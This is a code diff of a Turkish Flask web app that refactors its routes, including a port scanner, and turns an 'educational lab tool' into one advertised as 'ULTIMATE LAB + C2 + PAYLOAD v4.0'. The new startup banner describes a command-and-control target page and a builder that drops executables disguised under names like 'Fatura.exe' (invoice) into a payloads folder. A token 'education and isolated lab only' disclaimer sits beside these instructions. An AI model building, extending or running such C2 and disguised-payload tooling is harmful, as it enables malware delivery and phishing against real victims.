-    result = egitim.sim_simulasyonu()
-    return jsonify(result)
+    return jsonify(egitim.sim_simulasyonu())
 
 @app.route('/api/adres_bul', methods=['POST'])
 def api_adres():
     data = request.json
-    lat = data.get('lat')
-    lon = data.get('lon')
-    result = egitim.adres_bul(lat, lon)
-    return jsonify(result)
+    return jsonify(egitim.adres_bul(data.get('lat'), data.get('lon')))
 
 @app.route('/api/port_tara', methods=['POST'])
 def api_port():
     data = request.json
     hedef = data.get('hedef')
     portlar_str = data.get('portlar')
-    if portlar_str:
-        portlar = [int(p.strip()) for p in portlar_str.split(',')]
-    else:
-        portlar = [80, 443, 22, 21, 8080]
-    result = egitim.port_tara(hedef, portlar)
-    return jsonify(result)
+    portlar = [int(p.strip()) for p in portlar_str.split(',')] if portlar_str else [80, 443, 22, 21, 8080]
+    return jsonify(egitim.port_tara(hedef, portlar))
 
 @app.route('/api/dns_sorgula', methods=['POST'])
 def api_dns():
     data = request.json
-    domain = data.get('domain')
-    result = egitim.dns_sorgula(domain)
-    return jsonify(result)
+    return jsonify(egitim.dns_sorgula(data.get('domain')))
 
-@app.route('/api/whois_sorgula', methods=['POST'])
-def api_whois():
-    data = request.json
-    domain = data.get('domain')
-    result = egitim.whois_sorgula(domain)
-    return jsonify(result)
-
-@app.route('/api/ping_test', methods=['POST'])
-def api_ping():
-    data = request.json
-    hedef = data.get('hedef')
-    result = egitim.ping_test(hedef)
-    return jsonify(result)
-
-# ==================== ANA BAŞLATICI ====================
 def open_browser():
     time.sleep(1.5)
     webbrowser.open('http://localhost:5000/lab')
 
 if __name__ == '__main__':
     print("""
-╔══════════════════════════════════════════════════════════════════╗
-║     ULTIMATE LABORATUVAR ARACI - TEK DOSYA (v3.0)               ║
-║                                                                  ║
-║  📱 TELEFON İÇİN:                                               ║
-║     http://<BILGISAYAR_IP>:5000                                 ║
-║                                                                  ║
-║  💻 BİLGİSAYAR EĞİTİM ARAYÜZÜ:                                  ║
-║     http://localhost:5000/lab                                   ║
-║                                                                  ║
-║  🛠️ ARAÇLAR: IP Konum | SIM Simülasyonu | Adres Bul |          ║
-║            Port Tarama | DNS | Ping | Whois                     ║
-║                                                                  ║
-║  ⚠️ SADECE EĞİTİM VE İZOLE LABORATUVAR İÇİNDİR                 ║
-╚══════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════════════════╗
+║     ULTIMATE LAB + C2 + PAYLOAD v4.0                                         ║
+║                                                                              ║
+║  📱 TELEFON İÇİN:  http://<IP>:5000                                         ║
+║  💻 LAB ARAYÜZ:    http://localhost:5000/lab                                ║
+║  🎯 C2 HEDEFLER:   http://localhost:5000/c2/hedefler_html                   ║
+║                                                                              ║
+║  🧪 PAYLOAD OLUŞTUR:                                                         ║
+║     1. Arayüzden "Payload Oluşturucu" sekmesine git                         ║
+║     2. EXE adını gir (örn: Fatura.exe)                                      ║
+║     3. Oluştur butonuna bas                                                ║
+║     4. payloads/ klasöründe EXE hazır                                       ║
+║                                                                              ║
+║  ⚠️ SADECE EĞİTİM VE İZOLE LABORATUVAR İÇİNDİR                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
     """)
-    
-    # Tarayıcıyı otomatik aç
     threading.Thread(target=open_browser, daemon=True).start()
-    
     app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
